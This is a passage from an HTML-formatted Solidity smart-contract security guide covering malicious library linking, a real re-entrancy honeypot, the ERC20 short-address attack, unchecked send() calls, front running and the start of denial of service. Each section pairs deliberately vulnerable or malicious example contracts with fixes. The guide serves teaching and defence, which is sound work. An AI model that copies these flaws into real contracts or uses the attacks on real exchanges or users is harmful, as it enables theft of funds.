                { char:= sub(<span class="hljs-number">0x60</span>, sub(<span class="hljs-number">0x7A</span>,char)) } <span class="hljs-comment">// subtract from the ascii number a by the difference char is from z.</span>
                <span class="hljs-keyword">if</span> iszero(eq(char, <span class="hljs-number">0x20</span>)) <span class="hljs-comment">// ignore spaces</span>
                {mstore8(add(add(text,<span class="hljs-number">0x20</span>), mul(i,<span class="hljs-number">1</span>)), add(char,<span class="hljs-number">26</span>))} <span class="hljs-comment">// add 13 to char.</span>
            }
        }
        <span class="hljs-function"><span class="hljs-keyword">emit</span> <span class="hljs-literal">Result</span>(<span class="hljs-params">text</span>)</span>;
    }

    <span class="hljs-comment">// rot13 decrypt a string</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rot13Decrypt</span> (<span class="hljs-params"><span class="hljs-built_in">string</span> text</span>) <span class="hljs-title">public</span> </span>{
        <span class="hljs-built_in">uint256</span> length = <span class="hljs-built_in">bytes</span>(text).length;
        <span class="hljs-keyword">for</span> (var i = <span class="hljs-number">0</span>; i &lt; length; i++) {
            <span class="hljs-built_in">byte</span> char = <span class="hljs-built_in">bytes</span>(text)[i];
            <span class="hljs-keyword">assembly</span> {
                char := <span class="hljs-built_in">byte</span>(<span class="hljs-number">0</span>,char)
                <span class="hljs-keyword">if</span> and(gt(char,<span class="hljs-number">0x60</span>), lt(char,<span class="hljs-number">0x6E</span>))
                { char:= add(<span class="hljs-number">0x7B</span>, sub(char,<span class="hljs-number">0x61</span>)) }
                <span class="hljs-keyword">if</span> iszero(eq(char, <span class="hljs-number">0x20</span>))
                {mstore8(add(add(text,<span class="hljs-number">0x20</span>), mul(i,<span class="hljs-number">1</span>)), sub(char,<span class="hljs-number">26</span>))}
            }
        }
        <span class="hljs-function"><span class="hljs-keyword">emit</span> <span class="hljs-literal">Result</span>(<span class="hljs-params">text</span>)</span>;
    }
}
</pre></div>

<p>which implements the rot26 cipher (shifts each character by 26 places, get it? :p). Again, there is no need to understand the assembly in this contract. The deployer could have also linked the following contract:</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">Print</span></span>{
    <span class="hljs-class"><span class="hljs-keyword">event</span> <span class="hljs-literal">Print</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> text</span>)</span>;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rot13Encrypt</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> text</span>) <span class="hljs-title">public</span> </span>{
        <span class="hljs-function"><span class="hljs-keyword">emit</span> <span class="hljs-literal">Print</span>(<span class="hljs-params">text</span>)</span>;
    }
 }
</pre></div>

<p>If the address of either of these contracts were given in the constructor, the <code>encryptPrivateData()</code> function would simply produce an event which prints the unencrypted private data. Although in this example a library-like contract was set in the constructor, it is often the case that a privileged user (such as an <code>owner</code>) can change library contract addresses. If a linked contract doesn't contain the function being called, the fallback function will execute. For example, with the line <code>encryptionLibrary.rot13Encrypt()</code>, if the contract specified by <code>encryptionLibrary</code> was:</p>
<div class="highlight"><pre class="hljs language-solidity"> <span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">Blank</span> </span>{
     <span class="hljs-class"><span class="hljs-keyword">event</span> <span class="hljs-literal">Print</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> text</span>)</span>;
     <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>{
         <span class="hljs-function"><span class="hljs-keyword">emit</span> <span class="hljs-literal">Print</span>(<span class="hljs-params"><span class="hljs-string">"Here"</span></span>)</span>;
         <span class="hljs-comment">//put malicious code here and it will run</span>
     }
 }
</pre></div>

<p>then an event with the text "Here" would be emitted. Thus if users can alter contract libraries, they can in principle get users to unknowingly run arbitrary code.</p>
<p><em>Note: Don't use encryption contracts such as these, as the input parameters to smart contracts are visible on the blockchain. Also the Rot cipher is not a recommended encryption technique :p</em></p>
<h3 id="cr-prevention">Preventative Techniques</h3>

<p>As demonstrated above, vulnerability free contracts can (in some cases) be deployed in such a way that they behave maliciously. An auditor could publicly verify a contract and have it's owner deploy it in a malicious way, resulting in a publicly audited contract which has vulnerabilities or malicious intent.</p>
<p>There are a number of techniques which prevent these scenarios.</p>
<p>One technique, is to use the <code>new</code> keyword to create contracts. In the example above, the constructor could be written like:</p>
<div class="highlight"><pre class="hljs language-delphi">    <span class="hljs-function"><span class="hljs-keyword">constructor</span><span class="hljs-params">()</span> <span class="hljs-comment">{
        encryptionLibrary = new Rot13Encryption();
    }</span>
</span></pre></div>

<p>This way an instance of the referenced contract is created at deployment time and the deployer cannot replace the <code>Rot13Encryption</code> contract with anything else without modifying the smart contract.</p>
<p>Another solution is to hard code any external contract addresses if they are known.</p>
<p>In general, code that calls external contracts should always be looked at carefully. As a developer, when defining external contracts, it can be a good idea to make the contract addresses public (which is not the case in the honey-pot example given below) to allow users to easily examine which code is being referenced by the contract. Conversely, if a contract has a private variable contract address it can be a sign of someone behaving maliciously (as shown in the real-world example). If a privileged (or any) user is capable of changing a contract address which is used to call external functions, it can be important (in a decentralised system context) to implement a time-lock or voting mechanism to allow users to see which code is being changed or to give participants a chance to opt in/out with the new contract address.</p>
<h3 id="cr-example">Real-World Example: Re-Entrancy Honey Pot</h3>

<p>A number of recent honey pots have been released on the mainnet. These contracts try to outsmart Ethereum hackers who try to exploit the contracts, but who in turn end up getting ether lost to the contract they expect to exploit. One example employs the above attack by replacing an expected contract with a malicious one in the constructor. The code can be found <a href="https://etherscan.io/address/0x95d34980095380851902ccd9a1fb4c813c2cb639#code">here</a>:</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-keyword">pragma</span> solidity ^<span class="hljs-number">0.4</span><span class="hljs-number">.19</span>;

<span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">Private_Bank
</span></span>{
    <span class="hljs-keyword">mapping</span> (<span class="hljs-built_in">address</span> =&gt; <span class="hljs-built_in">uint</span>) <span class="hljs-keyword">public</span> balances;
    <span class="hljs-built_in">uint</span> <span class="hljs-keyword">public</span> MinDeposit = <span class="hljs-number">1</span> <span class="hljs-built_in">ether</span>;
    Log TransferLog;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Private_Bank</span>(<span class="hljs-params"><span class="hljs-built_in">address</span> _log</span>)
    </span>{
        TransferLog = Log(_log);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Deposit</span>(<span class="hljs-params"></span>)
    <span class="hljs-title">public</span>
    <span class="hljs-title">payable</span>
    </span>{
        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> &gt;= MinDeposit)
        {
            balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>]+=<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;
            TransferLog.AddMessage(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>,<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>,<span class="hljs-string">"Deposit"</span>);
        }
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">CashOut</span>(<span class="hljs-params"><span class="hljs-built_in">uint</span> _am</span>)
    </span>{
        <span class="hljs-keyword">if</span>(_am&lt;=balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>])
        {
            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>.<span class="hljs-built_in">value</span>(_am)())
            {
                balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>]-=_am;
                TransferLog.AddMessage(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>,_am,<span class="hljs-string">"CashOut"</span>);
            }
        }
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">payable</span></span>{}

}

<span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">Log
</span></span>{
    <span class="hljs-function"><span class="hljs-keyword">struct</span> <span class="hljs-title">Message
</span>    </span>{
        <span class="hljs-built_in">address</span> Sender;
        <span class="hljs-built_in">string</span>  Data;
        <span class="hljs-built_in">uint</span> Val;
        <span class="hljs-built_in">uint</span>  Time;
    }

    Message[] <span class="hljs-keyword">public</span> History;
    Message LastMsg;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">AddMessage</span>(<span class="hljs-params"><span class="hljs-built_in">address</span> _adr,<span class="hljs-built_in">uint</span> _val,<span class="hljs-built_in">string</span> _data</span>)
    <span class="hljs-title">public</span>
    </span>{
        LastMsg.Sender = _adr;
        LastMsg.Time = <span class="hljs-built_in">now</span>;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}
</pre></div>

<p>This <a href="https://www.reddit.com/r/ethdev/comments/7x5rwr/tricked_by_a_honeypot_contract_or_beaten_by/">post</a> by one reddit user explains how they lost 1 ether to this contract by trying to exploit the re-entrancy bug they expected to be present in the contract.</p>
<h2 id="short-address"><span id="SP-8">8. Short Address/Parameter Attack</span></h2>

<p>This attack is not specifically performed on Solidity contracts themselves but on third party applications that may interact with them. I add this attack for completeness and to be aware of how parameters can be manipulated in contracts.</p>
<p>For further reading, see <a href="https://vessenes.com/the-erc20-short-address-attack-explained/">The ERC20 Short Address Attack Explained</a>, <a href="https://medium.com/huzzle/ico-smart-contract-vulnerability-short-address-attack-31ac9177eb6b">ICO Smart contract Vulnerability: Short Address Attack</a> or this <a href="https://www.reddit.com/r/ethereum/comments/6r9nhj/cant_understand_the_erc20_short_address_attack/">reddit post</a>.</p>
<h3 id="short-vuln">The Vulnerability</h3>

<p>When passing parameters to a smart contract, the parameters are encoded according to the <a href="https://solidity.readthedocs.io/en/latest/abi-spec.html">ABI specification</a>. It is possible to send encoded parameters that are shorter than the expected parameter length (for example, sending an address that is only 38 hex chars (19 bytes) instead of the standard 40 hex chars (20 bytes)). In such a scenario, the EVM will pad 0's to the end of the encoded parameters to make up the expected length.</p>
<p>This becomes an issue when third party applications do not validate inputs. The clearest example is an exchange which doesn't verify the address of an <a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md">ERC20</a> token when a user requests a withdrawal. This example is covered in more detail in Peter Venesses' post, <a href="http://vessenes.com/the-erc20-short-address-attack-explained/">The ERC20 Short Address Attack Explained</a> mentioned above.</p>
<p>Consider, the standard <a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md">ERC20</a> transfer function interface, noting the order of the parameters,</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transfer</span>(<span class="hljs-params"><span class="hljs-built_in">address</span> to, <span class="hljs-built_in">uint</span> tokens</span>) <span class="hljs-title">public</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">bool</span> success</span>)</span>;
</pre></div>

<p>Now consider, an exchange, holding a large amount of a token (let's say <code>REP</code>) and a user wishes to withdraw their share of 100 tokens. The user would submit their address, <code>0xdeaddeaddeaddeaddeaddeaddeaddeaddeaddead</code> and the number of tokens, <code>100</code>. The exchange would encode these parameters in the order specified by the <code>transfer()</code> function, i.e. <code>address</code> then <code>tokens</code>. The encoded result would be <code>a9059cbb000000000000000000000000deaddeaddeaddeaddeaddeaddeaddeaddeaddead0000000000000</code> <code>000000000000000000000000000000000056bc75e2d63100000</code>. The first four bytes (<code>a9059cbb</code>) are the <code>transfer()</code> <a href="https://solidity.readthedocs.io/en/latest/abi-spec.html#function-selector">function signature/selector</a>, the second 32 bytes are the address, followed by the final 32 bytes which represent the <code>uint256</code> number of tokens. Notice that the hex <code>56bc75e2d63100000</code> at the end corresponds to 100 tokens (with 18 decimal places, as specified by the <code>REP</code> token contract).</p>
<p>Ok, so now let's look at what happens if we were to send an address that was missing 1 byte (2 hex digits). Specifically, let's say an attacker sends <code>0xdeaddeaddeaddeaddeaddeaddeaddeaddeadde</code>as an address (missing the last two digits) and the same  <code>100</code> tokens to withdraw. If the exchange doesn't validate this input, it would get encoded as <code>a9059cbb000000000000000000000000deaddeaddeaddeaddeaddeaddeaddeaddeadde00000000000000</code> <code>00000000000000000000000000000000056bc75e2d6310000000</code>. The difference is subtle. Note that <code>00</code> has been padded to the end of the encoding, to make up for the short address that was sent. When this gets sent to the smart contract, the <code>address</code> parameters will read as <code>0xdeaddeaddeaddeaddeaddeaddeaddeaddeadde00</code> and the value will be read as <code>56bc75e2d6310000000</code> (notice the two extra <code>0</code>'s). This value is now, <code>25600</code> tokens (the value has been multiplied by <code>256</code>). In this example, if the exchange held this many tokens, the user would withdraw <code>25600</code> tokens (whilst the exchange thinks the user is only withdrawing <code>100</code>) to the modified address. Obviously the attacker won't possess the modified address in this example, but if the attacker were to generate any address which ended in <code>0</code>'s (which can be easily brute forced) and used this generated address, they could easily steal tokens from the unsuspecting exchange.</p>
<h3 id="short-prev">Preventative Techniques</h3>

<p>I suppose it is obvious to say that validating all inputs before sending them to the blockchain will prevent these kinds of attacks. It should also be noted that parameter ordering plays an important role here. As padding only occurs at the end, careful ordering of parameters in the smart contract can potentially mitigate some forms of this attack.</p>
<h3 id="short-example">Real-World Example: Unknown</h3>

<p>I do not know of any publicised attack of this kind in the wild.</p>
<h2 id="unchecked-calls"><span id="SP-9">9. Unchecked CALL Return Values</span></h2>

<p>There a number of ways of performing external calls in solidity. Sending ether to external accounts is commonly performed via the <code>transfer()</code> method.  However, the <code>send()</code> function can also be used and, for more versatile external calls, the <code>CALL</code> opcode can be directly employed in solidity. The <code>call()</code> and <code>send()</code> functions return a boolean indicating if the call succeeded or failed. Thus these functions have a simple caveat, in that the transaction that executes these functions will not revert if the external call (initialised by <code>call()</code> or <code>send()</code>) fails, rather the <code>call()</code> or <code>send()</code> will simply return <code>false</code>. A common pitfall arises when the return value is not checked, rather the developer expects a revert to occur.</p>
<p>For further reading, see <a href="http://www.dasp.co/#item-4">DASP Top 10</a> and <a href="http://hackingdistributed.com/2016/06/16/scanning-live-ethereum-contracts-for-bugs/">Scanning Live Ethereum Contracts for the "Unchecked-Send" Bug</a>.</p>
<h3 id="unchecked-calls-vuln">The Vulnerability</h3>

<p>Consider the following example:</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">Lotto</span> </span>{

    <span class="hljs-built_in">bool</span> <span class="hljs-keyword">public</span> payedOut = <span class="hljs-literal">false</span>;
    <span class="hljs-built_in">address</span> <span class="hljs-keyword">public</span> winner;
    <span class="hljs-built_in">uint</span> <span class="hljs-keyword">public</span> winAmount;

    <span class="hljs-comment">// ... extra functionality here</span>

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sendToWinner</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>{
        <span class="hljs-built_in">require</span>(!payedOut);
        winner.send(winAmount);
        payedOut = <span class="hljs-literal">true</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdrawLeftOver</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>{
        <span class="hljs-built_in">require</span>(payedOut);
        <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.send(<span class="hljs-keyword">this</span>.balance);
    }
}
</pre></div>

<p>This contract represents a Lotto-like contract, where a <code>winner</code> receives <code>winAmount</code> of ether, which typically leaves a little left over for anyone to withdraw.</p>
<p>The bug exists on line [11] where a <code>send()</code> is used without checking the response. In this trivial example, a <code>winner</code> whose transaction fails (either by running out of gas or being a contract that intentionally throws in the fallback function) allows <code>payedOut</code> to be set to <code>true</code> (regardless of whether ether was sent or not). In this case, the public can withdraw the <code>winner</code>'s winnings via the <code>withdrawLeftOver()</code> function.</p>
<h3 id="unchecked-calls-prev">Preventative Techniques</h3>

<p>Whenever possible, use the <code>transfer()</code> function rather than <code>send()</code> as <code>transfer()</code> will <code>revert</code> if the external transaction reverts. If <code>send()</code> is required, always ensure to check the return value.</p>
<p>An even more robust <a href="http://solidity.readthedocs.io/en/latest/common-patterns.html#withdrawal-from-contracts">recommendation</a> is to adopt a <em>withdrawal pattern</em>. In this solution, each user is burdened with calling an isolated function (i.e. a <em>withdraw</em> function) which handles the sending of ether out of the contract and therefore independently deals with the consequences of failed send transactions. The idea is to logically isolate the external send functionality from the rest of the code base and place the burden of potentially failed transaction to the end-user who is calling the <em>withdraw</em> function.</p>
<h3 id="unchecked-calls-example">Real-World Example: Etherpot and King of the Ether</h3>

<p><a href="https://github.com/etherpot">Etherpot</a> was a smart contract lottery, not too dissimilar to the example contract mentioned above. The solidity code for etherpot, can be found here: <a href="https://github.com/etherpot/contract/blob/master/app/contracts/lotto.sol">lotto.sol</a>. The primary downfall of this contract was due to an incorrect use of block hashes (only the last 256 block hashes are useable, see Aakil Fernandes's <a href="http://aakilfernandes.github.io/blockhashes-are-only-good-for-256-blocks">post</a> about how Etherpot failed to implement this correctly). However this contract also suffered from an unchecked call value. Notice the function, <code>cash()</code> on line [80] of lotto.sol:</p>
<div class="highlight"><pre class="hljs language-reasonml">...
  <span class="hljs-keyword">function</span> cash(uint roundIndex, uint subpotIndex){

        var subpotsCount = get<span class="hljs-constructor">SubpotsCount(<span class="hljs-params">roundIndex</span>)</span>;

        <span class="hljs-keyword">if</span>(subpotIndex&gt;=subpotsCount)
            return;

        var decisionBlockNumber = get<span class="hljs-constructor">DecisionBlockNumber(<span class="hljs-params">roundIndex</span>,<span class="hljs-params">subpotIndex</span>)</span>;

        <span class="hljs-keyword">if</span>(decisionBlockNumber&gt;block.number)
            return;

        <span class="hljs-keyword">if</span>(rounds<span class="hljs-literal">[<span class="hljs-identifier">roundIndex</span>]</span>.isCashed<span class="hljs-literal">[<span class="hljs-identifier">subpotIndex</span>]</span>)
            return;
        <span class="hljs-comment">//Subpots can only be cashed once. This is to prevent double payouts</span>

        var winner = calculate<span class="hljs-constructor">Winner(<span class="hljs-params">roundIndex</span>,<span class="hljs-params">subpotIndex</span>)</span>;
        var subpot = get<span class="hljs-constructor">Subpot(<span class="hljs-params">roundIndex</span>)</span>;

        winner.send(subpot);

        rounds<span class="hljs-literal">[<span class="hljs-identifier">roundIndex</span>]</span>.isCashed<span class="hljs-literal">[<span class="hljs-identifier">subpotIndex</span>]</span> = <span class="hljs-literal">true</span>;
        <span class="hljs-comment">//Mark the round as cashed</span>
}<span class="hljs-operator">
...
</span></pre></div>

<p>Notice that on line [21] the send function's return value is not checked, and the following line then sets a boolean indicating the winner has been sent their funds. This bug can allow a state where the winner does not receive their ether, but the state of the contract can indicate that the winner has already been paid.</p>
<p>A more serious version of this bug occurred in the <a href="https://www.kingoftheether.com/thrones/kingoftheether/index.html">King of the Ether</a>. An excellent <a href="https://www.kingoftheether.com/postmortem.html">post-mortem</a> of this contract has been written which details how an unchecked failed <code>send()</code> could be used to attack the contract.</p>
<h2 id="race-conditions"><span id="SP-10">10. Race Conditions / Front Running</span></h2>

<p>The combination of external calls to other contracts and the multi-user nature of the underlying blockchain gives rise to a variety of potential Solidity pitfalls whereby users <em>race</em> code execution to obtain unexpected states. <a href="https://blog.sigmaprime.io/solidity-security.html#reentrancy">Re-Entrancy</a> is one example of such a race condition. In this section we will talk more generally about different kinds of race conditions that can occur on the Ethereum blockchain. There is a variety of good posts on this subject, a few are: <a href="https://github.com/ethereum/wiki/wiki/Safety#race-conditions">Ethereum Wiki - Safety</a>, <a href="http://www.dasp.co/#item-7">DASP - Front-Running</a> and the <a href="https://consensys.github.io/smart-contract-best-practices/known_attacks/#race-conditions">Consensus - Smart Contract Best Practices</a>.</p>
<h3 id="race-conditions-vuln">The Vulnerability</h3>

<p>As with most blockchains, Ethereum nodes pool transactions and form them into blocks. The transactions are only considered valid once a miner has solved a consensus mechanism (currently <a href="https://github.com/ethereum/wiki/wiki/Ethash">ETHASH</a> PoW for Ethereum). The miner who solves the block also chooses which transactions from the pool will be included in the block, this is typically ordered by the <code>gasPrice</code> of a transaction. In here lies a potential attack vector. An attacker can watch the transaction pool for transactions which may contain solutions to problems, modify or revoke the attacker's permissions or change a state in a contract which is undesirable for the attacker. The attacker can then get the data from this transaction and create a transaction of their own with a higher <code>gasPrice</code> and get their transaction included in a block before the original.</p>
<p>Let's see how this could work with a simple example. Consider the contract <code>FindThisHash.sol</code>:</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">FindThisHash</span> </span>{
    <span class="hljs-built_in">bytes32</span> <span class="hljs-keyword">constant</span> <span class="hljs-keyword">public</span> hash = <span class="hljs-number">0xb5b5b97fafd9855eec9b41f74dfb6c38f5951141f9a3ecd7f44d5479b630ee0a</span>;

    <span class="hljs-function"><span class="hljs-literal">constructor</span>(<span class="hljs-params"></span>) <span class="hljs-keyword">public</span> <span class="hljs-keyword">payable</span> </span>{} <span class="hljs-comment">// load with ether</span>

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">solve</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> solution</span>) <span class="hljs-title">public</span> </span>{
        <span class="hljs-comment">// If you can find the pre image of the hash, receive 1000 ether</span>
        <span class="hljs-built_in">require</span>(hash == <span class="hljs-built_in">sha3</span>(solution));
        <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">transfer</span>(<span class="hljs-number">1000</span> <span class="hljs-built_in">ether</span>);
    }
}
</pre></div>

<p>Imagine this contract contains 1000 ether. The user who can find the pre-image of the sha3 hash <code>0xb5b5b97fafd9855eec9b41f74dfb6c38f5951141f9a3ecd7f44d5479b630ee0a</code> can submit the solution and retrieve the 1000 ether. Let's say one user figures out the solution is <code>Ethereum!</code>. They call <code>solve()</code> with <code>Ethereum!</code> as the parameter. Unfortunately an attacker has been clever enough to watch the transaction pool for anyone submitting a solution. They see this solution, check it's validity, and then submit an equivalent transaction with a much higher <code>gasPrice</code> than the original transaction. The miner who solves the block will likely give the attacker preference due to the higher <code>gasPrice</code> and accept their transaction before the original solver. The attacker will take the 1000 ether and the user who solved the problem will get nothing (there is no ether left in the contract).</p>
<p>A more realistic problem comes in the design of the future Casper implementation. The Casper proof of stake contracts invoke slashing conditions where users who notice validators double-voting or misbehaving are incentivised to submit proof that they have done so. The validator will be punished and the user rewarded. In such a scenario, it is expected that miners and users will front-run all such submissions of proof, and this issue must be addressed before the final release.</p>
<h3 id="race-conditions-prev">Preventative Techniques</h3>

<p>There are two classes of users who can perform these kinds of front-running attacks. Users (who modify the <code>gasPrice</code> of their transactions) and miners themselves (who can re-order the transactions in a block how they see fit). A contract that is vulnerable to the first class (users), is significantly worse-off than one vulnerable to the second (miners) as miner's can only perform the attack when they solve a block, which is unlikely for any individual miner targeting a specific block. Here I'll list a few mitigation measures with relation to which class of attackers they may prevent.</p>
<p>One method that can be employed is to create logic in the contract that places an upper bound on the <code>gasPrice</code>. This prevents users from increasing the <code>gasPrice</code> and getting preferential transaction ordering beyond the upper-bound. This preventative measure only mitigates the first class of attackers (arbitrary users). Miners in this scenario can still attack the contract as they can order the transactions in their block however they like, regardless of gas price.</p>
<p>A more robust method is to use a <a href="https://ethereum.stackexchange.com/questions/191/how-can-i-securely-generate-a-random-number-in-my-smart-contract">commit-reveal</a> scheme, whenever possible. Such a scheme dictates users send transactions with hidden information (typically a hash). After the transaction has been included in a block, the user sends a transaction revealing the data that was sent (the reveal phase). This method prevents both miners and users from frontrunning transactions as they cannot determine the contents of the transaction. This method however, cannot conceal the transaction value (which in some cases is the valuable information that needs to be hidden). The <a href="https://ens.domains/">ENS</a>  smart contract allowed users to send transactions, whose committed data included the amount of ether they were willing to spend. Users could then send transactions of arbitrary value. During the reveal phase, users were refunded the difference between the amount sent in the transaction and the amount they were willing to spend.</p>
<p>A further suggestion by Lorenz, Phil, Ari and Florian is to use <a href="http://hackingdistributed.com/2017/08/28/submarine-sends/">Submarine Sends</a>. An efficient implementation of this idea requires the <code>CREATE2</code> opcode, which currently hasn't been adopted, but seems likely in upcoming hard forks.</p>
<h3 id="race-conditions-example">Real-World Examples: ERC20 and Bancor</h3>

<p>The <a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md">ERC20</a> standard is quite well-known for building tokens on Ethereum. This standard has a potential frontrunning vulnerability which comes about due to the <code>approve()</code> function. A good explanation of this vulnerability can be found <a href="https://docs.google.com/document/d/1YLPtQxZu1UAvO9cZ1O2RPXBbT0mooh4DYKjA_jp-RLM/edit">here</a>.</p>
<p>The standard specifies the <code>approve()</code> function as:</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">approve</span>(<span class="hljs-params"><span class="hljs-built_in">address</span> _spender, <span class="hljs-built_in">uint256</span> _value</span>) <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">bool</span> success</span>)
</span></pre></div>

<p>This function allows a user to permit other users to transfer tokens on their behalf. The frontrunning vulnerability comes in the scenario when a user, Alice, <em>approves</em> her friend, <code>Bob</code> to spend <code>100 tokens</code>. Alice later decides that she wants to revoke <code>Bob</code>'s approval to spend <code>100 tokens</code>, so she creates a transaction that sets <code>Bob</code>'s allocation to <code>50 tokens</code>. <code>Bob</code>, who has been carefully watching the chain, sees this transaction and builds a transaction of his own spending the <code>100 tokens</code>. He puts a higher <code>gasPrice</code> on his transaction than <code>Alice</code>'s and gets his transaction prioritised over hers. Some implementations of <code>approve()</code> would allow <code>Bob</code> to transfer his <code>100 tokens</code>, then when <code>Alice</code>'s transaction gets committed, resets <code>Bob</code>'s approval to <code>50 tokens</code>, in effect giving <code>Bob</code> access to <code>150 tokens</code>. The mitigation strategies of this attack are given <a href="https://docs.google.com/document/d/1YLPtQxZu1UAvO9cZ1O2RPXBbT0mooh4DYKjA_jp-RLM/edit">here</a> in the document linked above.</p>
<p>Another prominent, real-world example is <a href="https://www.bancor.network/">Bancor</a>. Ivan Bogatty and his team documented a profitable attack on the initial Bancor implementation. His <a href="https://hackernoon.com/front-running-bancor-in-150-lines-of-python-with-ethereum-api-d5e2bfd0d798">blog post</a> and <a href="https://www.youtube.com/watch?v=RL2nE3huNiI">Devon 3 talk</a> discuss in detail how this was done. Essentially, prices of tokens are determined based on transaction value, users can watch the transaction pool for Bancor transactions and front run them to profit from the price differences. This attack has been addressed by the Bancor team.</p>
<h2 id="dos"><span id="SP-11">11. Denial Of Service (DOS)</span></h2>

<p>This category is very broad, but fundamentally consists of attacks where users can leave the contract inoperable for a small period of time, or in some cases, permanently. This can trap ether in these contracts forever, as was the case with the <a href="https://blog.sigmaprime.io/solidity-security.html#dc-example">Second Parity MultiSig hack</a></p>
<h3 id="dos-vuln">The Vulnerability</h3>

<p>There are various ways a contract can become inoperable. Here I will only highlight some potentially less-obvious Blockchain nuanced Solidity coding patterns that can lead to attackers performing DOS attacks.</p>
<p><strong>1. External calls without gas stipends</strong> - It may be the case that you wish
to make an external call to an unknown contract and continue processing the
transaction regardless whether that call fails or not. Typically this is
achieved by using the <code>CALL</code> opcode, which does not revert the transaction
if the call fails (see <a href="https://blog.sigmaprime.io/solidity-security.html#unchecked-calls">Unchecked CALL Return Values</a> for further details and examples).
Let us consider a simple example, where we have a contract wallet, that slowly
trickles out ether when the <code>withdraw()</code> function is called. A <code>partner</code> can
add their address and spend gas to call the withdraw, giving both the
<code>partner</code> and the <code>owner</code> 1% of the total contract balance.</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">TrickleWallet</span> </span>{

    <span class="hljs-built_in">address</span> <span class="hljs-keyword">public</span> partner; <span class="hljs-comment">// withdrawal partner - pay the gas, split the withdraw</span>
    <span class="hljs-built_in">address</span> <span class="hljs-keyword">public</span> <span class="hljs-keyword">constant</span> owner = <span class="hljs-number">0xA9E</span>;
    <span class="hljs-built_in">uint</span> timeLastWithdrawn;
    <span class="hljs-keyword">mapping</span>(<span class="hljs-built_in">address</span> =&gt; <span class="hljs-built_in">uint</span>) withdrawPartnerBalances; <span class="hljs-comment">// keep track of partners balances</span>

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setWithdrawPartner</span>(<span class="hljs-params"><span class="hljs-built_in">address</span> _partner</span>) <span class="hljs-title">public</span> </span>{
        <span class="hljs-built_in">require</span>(partner == <span class="hljs-string">'0x0'</span> || <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span> == partner);
        partner = _partner;
    }

    <span class="hljs-comment">// withdraw 1% to recipient and 1% to owner</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>{
        <span class="hljs-built_in">uint</span> amountToSend = <span class="hljs-built_in">address</span>(<span class="hljs-keyword">this</span>).balance/<span class="hljs-number">100</span>;
        <span class="hljs-comment">// perform a call without checking return</span>
        <span class="hljs-comment">// the recipient can revert, the owner will still get their share</span>
        partner.<span class="hljs-built_in">call</span>.<span class="hljs-built_in">value</span>(amountToSend)();
        owner.<span class="hljs-built_in">transfer</span>(amountToSend);
        <span class="hljs-comment">// keep track of last withdrawal time</span>
        timeLastWithdrawn = <span class="hljs-built_in">now</span>;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    <span class="hljs-comment">// allow deposit of funds</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) <span class="hljs-title">payable</span> </span>{}

    <span class="hljs-comment">// convenience function</span>
